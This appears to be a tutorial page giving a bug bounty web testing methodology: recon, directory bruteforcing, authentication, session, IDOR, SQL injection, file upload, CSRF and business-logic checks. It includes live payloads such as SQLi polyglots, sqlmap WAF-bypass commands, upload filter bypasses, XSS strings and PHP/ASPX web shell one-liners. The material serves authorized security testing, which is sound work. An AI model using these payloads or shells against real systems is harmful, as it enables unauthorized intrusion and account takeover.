Bug Bounty & Web App Testing Methodology

A structured approach to web application security testing adapted from Jason Haddix's Bug Hunter's Methodology (TBHM) — combining systematic recon, smart mapping, tactical fuzzing, and logic testing to find real vulnerabilities in modern applications.

Mindset: Crowdsourced vs Standard Testing

# Standard pentest:
# - Find common/broad vulnerabilities
# - Not competing against other researchers
# - Quality checked on approximation

# Bug bounty (crowdsourced):
# - Find unique, non-obvious bugs
# - Racing against time AND other researchers
# - Payment based on impact, not count
# - Templates for "most found" vuln classes are essential
# - Always verify domain/URL details before submitting — wrong scope = instant invalid

# Key strategy: find the road less traveled
# The flagship app is heavily tested → look for:
# - Subdomains via wildcard scope (*.acme.com)
# - Acquisitions with looser security posture (6-month grace period at Google)
# - Recently redesigned functions
# - Mobile app endpoints (often less tested than web)
# - New mobile app versions
# - Parent company assets via trademark or privacy policy searches

Phase 1 — Reconnaissance & Discovery

# Domain enumeration:
# passive: crt.sh, SecurityTrails, Shodan, DNS Dumpster, dnsx
# active: amass, subfinder, shuffledns (see /recon/subdomain-enum/)

# Scope expansion — Google dorking:
site:target.com -www.target.com          # find subdomains
site:target.com filetype:pdf             # documents
site:target.com inurl:admin              # admin panels
site:target.com intext:"Internal Use"    # exposed internal pages

# Acquisitions and related companies:
# en.wikipedia.org/wiki/List_of_mergers_and_acquisitions_by_Facebook
# Search: "targetname" "privacy policy" OR "trademark"

# Port scan every in-scope host — not just 80/443:
nmap -sS -A -PN -p- --script=http-title targets.txt
# Facebook had Jenkins Script console with no auth on high port
# IIS.net had RDP open vulnerable to MS12_020

# Tech fingerprinting (run on every endpoint):
# Wappalyzer (Chrome extension) — framework, CMS, server stack
# Builtwith.com — historical tech + hosting
# retire.js — outdated JS libs with known CVEs
# curl -v https://target.com 2>&1 | grep -i "server:\|x-powered-by:"

# After fingerprinting — search for CVEs for every identified component:
searchsploit wordpress 5.6
searchsploit Apache 2.4.49
# Check exploit-db, GitHub, NVD for public exploits

# JS file analysis — endpoints hidden in JS:
# In Burp: Target → Engagement Tools → Find Scripts
# Or: gau target.com | grep ".js" | httpx -status-code
# Extract endpoints from JS:
cat app.js | grep -oP '(?:api|/v[0-9]+/)[a-zA-Z0-9/_-]+'
# Use JSFinder or relative-url-extractor for automated extraction

Phase 2 — Application Mapping

# Smart directory bruteforce — layer your approach:
# 1. Start with targeted wordlists for the specific tech stack
# 2. After finding content, bruteforce directories that return auth-required codes

# Key insight: after bruteforcing, look for:
# GET /backlog/       → 404 (not found, skip)
# GET /controlpanel/  → 401 (auth required!) → BRUTEFORCE HERE
# GET /controlpanel/dashboard/ → 200 (exposed!)

# Wordlist selection for bruteforcing (from /recon/wordlist-guide/):
# Assetnote wordlists — tech-specific, derived from real crawls
# SecLists/Discovery/Web-Content/common.txt for quick sweep
# SecLists/Discovery/Web-Content/raft-medium-words.txt for thorough

# OSINT-assisted mapping — check for previously reported issues:
# xssed.com — historical XSS reports by domain
# /r/xss on Reddit — community-reported XSS
# GitHub issue trackers — often have bug reports with details

# Platform-specific scanning:
wpscan --url https://target.com --enumerate p,t,u  # WordPress
droopescan scan drupal -u https://target.com       # Drupal
cmsmap https://target.com                          # multi-CMS

# API endpoint discovery:
# Check /api/v1/, /api/v2/, /graphql, /swagger.json, /openapi.json
# Postman collections often shared publicly: Google "site:github.com target.com postman"
# JS source analysis for endpoint patterns

Phase 3 — Fast Testing Checklist

App Recon & Analysis

# Complete this for every target before attacking:

□ Map all visible content manually (click through every page, every function)
□ Discover hidden content (directory/file bruteforce)
□ Test for debug parameters (?debug=1, ?test=1, ?admin=1)
□ Identify all data entry points (every form, URL param, header, cookie)
□ Identify technologies (Wappalyzer, BuiltWith, response headers)
□ Research CVEs for each identified technology version
□ Gather tech-specific wordlists (Assetnote, SecLists)
□ Spider the application automatically (Burp Suite spider / crawler)
□ Extract and catalog all JS files for later analysis

# Priority input vectors for first-pass fuzzing:
# 1. Search boxes and filters
# 2. Registration and login forms
# 3. Password reset functions
# 4. Comment and message fields
# 5. File upload endpoints
# 6. URL parameters (especially ?id=, ?url=, ?file=, ?path=)
# 7. HTTP headers (User-Agent, Referer, X-Forwarded-For, Origin)

Authentication Testing

□ Test password quality rules (try: a, 1, password, ""  as passwords)
□ Test for username enumeration via:
  - Login: "Invalid username" vs "Invalid password" messages
  - Registration: "Username already taken" reveals valid users
  - Password reset: timing difference or distinct error messages
□ Test resilience to password guessing (lockout after N attempts?)
□ Test account recovery function:
  - Security questions guessable?
  - Reset token sent to email (is it time-limited?)
  - Can reset token be reused?
  - Does token expire (test 24h+ old token)?
□ Test "remember me" functionality (is it cryptographically random?)
□ Test multi-stage auth (can you skip steps 1 or 2 and go direct to step 3?)
□ Check for fail-open conditions (what happens on auth service failure?)
□ Verify unsafe credential distribution (email with plaintext password?)

Session Management

□ Capture cookies before login, during session, after logout
□ Test: old pre-login cookie still usable after authentication?
□ Test: is a new session token issued on login? (session fixation if not)
□ Test: is the session token invalidated on logout?
□ Test: are multiple concurrent sessions allowed? (session limits?)
□ Inspect token entropy: easily reversible? (base64 decoded? sequential?)
□ Check session token scope:
  - Is the token transmitted over HTTP anywhere?
  - Is it logged in URLs (Referer leak)?
  - Is the domain/path attribute correctly scoped?
□ Test for CSRF on all state-changing operations

# Quick token analysis:
echo -n "sessionvalue" | base64 -d  # is it just base64?
# If sequential: token123 → try token124
# Use Burp Sequencer to analyze entropy

Access Control & IDOR

□ Understand the role model: admin, user, guest (create test accounts for each)
□ Map all functions/views restricted to admin
□ Test each restricted function with a lower-privilege account
□ Try direct URL access to restricted views without authentication

# IDOR testing — the most common high-impact bug bounty finding:
# Find ALL numeric identifiers in URLs, requests, responses:
# /api/order/1234, /invoice?id=5678, /document/download?file_id=9012

# Manipulation patterns to test for each ID:
# - Increment: id=1234 → id=1235
# - Decrement: id=1234 → id=1233
# - Negative: id=-1
# - Zero: id=0
# - Other user's ID (swap your ID with victim's)
# - UUID if sequential? v1 UUIDs are time-based (predictable)

# High-value IDOR targets:
# - Password change → body: {"old_pw":"x","new_pw":"y","user_id":"VICTIM"}
# - Password reset → attempt with another account's token
# - Account deletion → try deleting another user
# - Admin-only endpoints → probe with lower-privilege account
# - Private files (PDFs, receipts, images, invoices)
# - Shipping info / purchase orders → modify order ID
# - Messages → change conversation/thread ID

# Tools:
# Autorize (Burp plugin) — automatically retests every request as lower-privilege user
# AuthMatrix — multi-role access control testing in Burp

  <h3>SQLi — Tactical Approach</h3>
  <pre><code># Core question: does this page call stored/queried data from the DB?
# Blind is the predominant type; error-based is rare in modern apps

# Karlsson polyglot — works in single-quote, double-quote, and bare contexts:
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

# Time-based SLEEP variants for initial detection:
'%2Bbenchmark(3200,SHA1(1))%2B'
'+BENCHMARK(40000000,SHA1(1337))+'

# SQLMap workflow (automate after manual confirmation):
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -l burp_log.xml --batch --dbs  # parse Burp log file
sqlmap -u "URL" --tamper=space2comment,randomcase  # WAF bypass

# High-value injection locations:
# - Web services / APIs (often have SQLi where web UI doesn't)
# - Order by, sort, and filter parameters
# - Search bars
# - XML/JSON POST bodies
# - HTTP headers: Cookie, User-Agent, X-Forwarded-For

# See /web/sql-injection/ for full exploitation chain including OOB and RCE</code></pre>

  <h3>File Upload — Tactical Approach</h3>
  <pre><code># Attack the upload → execute path first:
# 1. Upload .php/.asp/.aspx → does it execute?
# 2. Content-Type bypass: upload shell.php but set Content-Type: image/jpeg
# 3. Extension trickery: shell.php.jpg, shell.php%00.jpg, shell.php5, shell.phtml
# 4. Double extension: shell.jpg.php (some servers execute last extension)
# 5. Null byte: shell.php%00.jpg (older PHP versions)

# Then attack the parser:
# - XSS via SVG upload: <svg onload=alert(1)>
# - XSS via HTML file upload
# - XSS via EXIF metadata: exiftool -Comment='<script>alert(1)</script>' photo.jpg
# - DoS via extremely large image (ImageMagick processing)
# - XXE via SVG or Office file upload

# Open redirect via file upload (path traversal):
# Upload to: ../../../uploads/shell.php (test path traversal in filename)
# Or: ....//....//....//uploads/shell.php

# Web shell one-liners to try:
# PHP: <?php system($_GET["cmd"]); ?>
# ASPX: <%@ Page Language="C#" %><% Response.Write(Request["cmd"]); %>

# See /web/file-upload/ for full bypass methodology</code></pre>

  <h3>CSRF Testing Checklist</h3>
  <pre><code># Target: any state-changing operation (password change, email change, fund transfer, etc.)

□ Test without CSRF token → does request succeed?
□ Change request method GET → POST (or POST → GET)
□ Delete the CSRF token parameter entirely
□ Delete only the token value (keep parameter: csrf=)
□ Set token value to empty string (csrf=)
□ Use a valid token from a different session (same account, different browser)
□ Use a valid token from a completely different account
□ Replace token with same-length random string
□ Change Content-Type: application/json → text/plain (bypasses some SameSite restrictions)
□ Test if token is bound to session (or just syntactically valid)
□ Check if subdomains can set cookies (cookie scope bypass)
□ Test SameSite cookie attribute: None/Lax/Strict?
  - Lax: GET requests in top-level navigation still carry cookies
  - None: all cross-site requests carry cookie (classic CSRF vulnerable)
  - Strict: fully protected

# Tool: Burp CSRF PoC generator (right-click request → Engagement Tools → Generate CSRF PoC)</code></pre>

  <h2>Phase 5 — Logic Testing</h2>
  <pre><code># Logic bugs are hard to scan for — manual testing required

# Price manipulation:
# - Negative quantities in cart → negative price?
# - Edit price in intercepted request
# - Apply discount code multiple times
# - Race condition on checkout (buy same item twice simultaneously)

# Business logic bypass:
# - Multi-step wizard: can you skip step 2 and go direct to step 3?
# - Complete checkout without payment (submit POST /order/complete directly)
# - Race condition on "use once" voucher codes

# Trust boundary violations:
# - User A creates object → can User B modify it via IDOR?
# - Admin sets quantity cap → can user send raw API request bypassing UI limit?
# - Input validated client-side only → bypass via Burp intercept

# Transaction logic:
# - Negative balance transfer (transfer -$100 to gain $100)
# - Concurrent transfers depleting same balance (race condition)
# - Integer overflow in discount calculations</code></pre>

  <h2>The N-Minute Assessment (Data-Driven)</h2>
  <p>When time is limited, use this prioritized sequence to maximize findings per hour.</p>
  <pre><code># In the first 15 minutes — highest-yield targets:
1. Visit search, registration, contact, password reset, and comment forms
   → Hit every field with a polyglot XSS string + SLEEP(1) for SQLi
2. Burp: run active scanner on those specific forms
3. Check your cookie: log out → check cookie → log in → check cookie
   → Submit old pre-logout cookie to see if still valid (broken session invalidation)
4. User enumeration: login with valid user + wrong pass, then invalid user + wrong pass
   → Different error message or timing = enumerable usernames
5. Password reset: request reset → check if token in URL (not email body)
   → Use reset link twice → reuse old token

# In the next 30 minutes — common high-impact bugs:
6. Find numeric account identifiers in ANY URL → rotate ±1 (IDOR)
7. Find security-sensitive functions (admin, payment, password change)
   → Try accessing as lower-privilege user (auth bypass)
   → Try CSRF (is token present? can it be bypassed?)
   → Try over HTTP (mixed content)
8. Run SecLists short bruteforce on directory discovery
9. Check file upload: try uploading .php, .html, .svg

# Auxiliary / lower priority (remaining time):
10. Content spoofing (inject HTML but not JS)
11. Security headers missing (HSTS, CSP, X-Frame-Options)
12. Path disclosure in error messages
13. Clickjacking (X-Frame-Options missing)
14. Sensitive data in URL parameters (logged by proxies, Referer header)
15. Autocomplete enabled on password fields</code></pre>

  <h2>Reporting Template Notes</h2>
  <pre><code># Bug bounty reports need:
# 1. Clear description of the vulnerability class
# 2. Steps to reproduce (exact URLs, parameters, payloads)
# 3. Impact statement (what an attacker can do, what data is at risk)
# 4. PoC (screenshot or video preferred)
# 5. Suggested remediation

# Common causes of report rejection:
# - Wrong domain/URL in report (ALWAYS double-check)
# - Out of scope target
# - Duplicate (always search the program for similar reports first)
# - Theoretical without demonstrated impact
# - Self-XSS (requires victim to inject their own payload)

# Resources:
# bugcrowd.com/blog/advice-for-writing-a-great-vulnerability-report/
# forum.bugcrowd.com/t/writing-a-bug-report-attack-scenario-and-impact-are-key/640</code></pre>
